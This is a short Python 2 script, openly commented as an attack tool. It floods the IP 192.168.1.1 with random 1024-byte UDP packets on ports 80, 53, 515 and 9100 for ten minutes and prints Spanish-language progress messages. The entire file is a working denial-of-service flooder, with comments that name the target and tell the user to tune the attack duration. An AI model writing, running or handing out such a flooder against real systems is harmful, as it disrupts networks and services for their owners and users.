import socket #Imports needed libraries
import random
import time
sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM) #Creates a socket
bytes=random._urandom(1024) #Creates packet
ip='192.168.1.1' #The IP we are attacking
port=80 #Port we direct to attack
port2=53
port3=515
port4=9100
sent=0
st = time.time()
print 'duro'
st = time.time()


while(1): #Infinitely loops sending packets to the port until the program is exited.
	end = time.time()
	if(end-st<600):#Change this value to change the duration of attack!!!
		sock.sendto(bytes,(ip,port2))
		sock.sendto(bytes,(ip,port3))
		sock.sendto(bytes,(ip,port4))
		sock.sendto(bytes,(ip,port))
		print "%s paquetes de UDP se han enviado al IP: %s en el puerto: %s." % (sent,ip,port)
		sent= sent + 1
	else:
		exit()
